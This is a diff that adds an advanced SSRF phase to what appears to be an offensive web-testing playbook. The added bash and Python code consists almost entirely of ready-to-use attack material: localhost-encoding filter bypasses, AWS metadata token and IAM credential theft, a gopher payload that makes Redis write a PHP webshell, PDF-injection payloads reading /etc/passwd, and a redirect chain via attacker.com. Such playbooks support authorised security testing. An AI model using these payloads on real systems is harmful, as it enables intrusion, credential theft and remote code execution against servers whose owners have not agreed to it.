@@ -379,6 +379,119 @@ grep "ssti" $ENG/loot/interactsh_*.log 2>/dev/null && echo "[SSTI RCE CONFIRMED]
 
 ---
 
+## Phase 5b — SSRF Advanced: Protocol Smuggling & Filter Bypass
+
+**Why**: Basic SSRF testing probes `http://169.254.169.254` but most real-world filter bypasses require IP encoding tricks or protocol abuse. Gopher protocol unlocks internal service exploitation (Redis → RCE, SMTP → email spoofing).
+
+```bash
+TARGET_URL=<target_url>
+OAST=<oast_domain>
+# Find an SSRF-vulnerable parameter first (Phase 1 above), then use these advanced payloads
+
+SSRF_ENDPOINT="$TARGET_URL/api/fetch"   # replace with confirmed SSRF endpoint
+SSRF_PARAM="url"                        # replace with confirmed SSRF parameter
+
+echo "=== Phase 5b: SSRF Advanced ==="
+
+echo "--- Filter Bypass: IP Encoding Variants ---"
+# All resolve to 127.0.0.1 — bypass allowlist/denylist checks
+for bypass_ip in \
+    "http://127.0.0.1/" \
+    "http://2130706433/" \
+    "http://0x7f000001/" \
+    "http://0177.0.0.1/" \
+    "http://[::1]/" \
+    "http://[::ffff:127.0.0.1]/" \
+    "http://127.000.000.001/" \
+    "http://127.1/" \
+    "http://0/" \
+    "http://localhost/" \
+    "http://LOCALHOST/" \
+    "http://①②⑦.⓪.⓪.①/" \
+    "http://127.0.0.1.nip.io/" \
+    "http://$OAST@127.0.0.1/" \
+    "http://127.0.0.1#@$OAST/"; do
+
+    RESP=$(curl -sk -X POST "$SSRF_ENDPOINT" \
+        -H "Content-Type: application/json" \
+        -d "{\"$SSRF_PARAM\":\"$bypass_ip\"}" \
+        -o /tmp/ssrf_bypass.txt --max-time 5 -w "%{http_code}" 2>/dev/null)
+    BODY=$(head -c 100 /tmp/ssrf_bypass.txt 2>/dev/null)
+    echo "  $bypass_ip → HTTP $RESP | $(echo $BODY | head -c 60)"
+done
+
+echo ""
+echo "--- AWS IMDS v2 (requires token exchange) ---"
+# IMDSv2 requires PUT first to get token, then use token in GET
+TOKEN_RESP=$(curl -sk -X POST "$SSRF_ENDPOINT" \
+    -H "Content-Type: application/json" \
+    -d "{\"$SSRF_PARAM\":\"http://169.254.169.254/latest/api/token\",\"method\":\"PUT\",\"headers\":{\"X-aws-ec2-metadata-token-ttl-seconds\":\"21600\"}}" \
+    2>/dev/null | head -c 200)
+echo "  IMDSv2 token request: $TOKEN_RESP"
+echo "  (if token returned, use it to access /latest/meta-data/iam/security-credentials/)"
+
+echo ""
+echo "--- Gopher Protocol: Redis SSRF → RCE ---"
+# Gopher lets SSRF speak raw TCP — send Redis RESP commands
+# Payload: FLUSHALL + SET / SAVE webshell to /var/www/html/
+REDIS_CMD=$(python3 - << 'PYEOF'
+import urllib.parse
+
+# Redis commands to write a PHP webshell
+commands = [
+    "*1\r\n$8\r\nFLUSHALL\r\n",
+    "*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n\n\n<?php system($_GET['cmd']); ?>\n\n\r\n",
+    "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n",
+    "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n",
+    "*1\r\n$4\r\nSAVE\r\n",
+]
+
+payload = "".join(commands)
+encoded = urllib.parse.quote(payload, safe='')
+print(f"gopher://127.0.0.1:6379/_{encoded}")
+PYEOF
+)
+
+echo "  Redis gopher payload (send via SSRF parameter):"
+echo "  $REDIS_CMD"
+echo ""
+echo "  Also test common internal ports via gopher:"
+for port in 6379 11211 9200 5432 3306 27017 8080 8443; do
+    echo "  gopher://127.0.0.1:$port/_test"
+done
+
+echo ""
+echo "--- SSRF via PDF Generation (wkhtmltopdf/WeasyPrint) ---"
+# If app has PDF generation (invoice, report, receipt):
+# Inject <iframe> or <link> tag in template input
+for pdf_payload in \
+    '<iframe src="file:///etc/passwd"></iframe>' \
+    '<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>' \
+    '<link rel="import" href="file:///etc/passwd">' \
+    '<script>document.write(window.location)</script>'; do
+    echo "  PDF payload: $pdf_payload"
+done
+echo "  → Inject into: invoice address field, report title, user bio rendered to PDF"
+
+echo ""
+echo "--- SSRF via DNS Rebinding ---"
+echo "  Tool: https://lock.cmpxchg8b.com/rebinder.html (singularity of origin)"
+echo "  Flow:"
+echo "  1. Set up DNS that alternates 127.0.0.1 ↔ allowed_IP with low TTL"
+echo "  2. Server validates URL → DNS resolves to allowed_IP (passes check)"
+echo "  3. Server fetches URL → DNS TTL expired → resolves to 127.0.0.1"
+echo "  4. Server fetches internal service thinking it's the allowed domain"
+
+echo ""
+echo "--- SSRF via URL Redirect ---"
+echo "  If server validates URL then follows redirects:"
+echo "  1. Put SSRF payload on your server: curl https://attacker.com/redir → 302 → http://169.254.169.254/..."
+echo "  2. Send to SSRF endpoint: {url: 'https://attacker.com/redir'}"
+echo "  3. Server validates attacker.com (allowed) then follows redirect to internal IP"
+```
+
+---
+
 ## Phase 6 — Verify Callbacks & Document
 
 ```bash
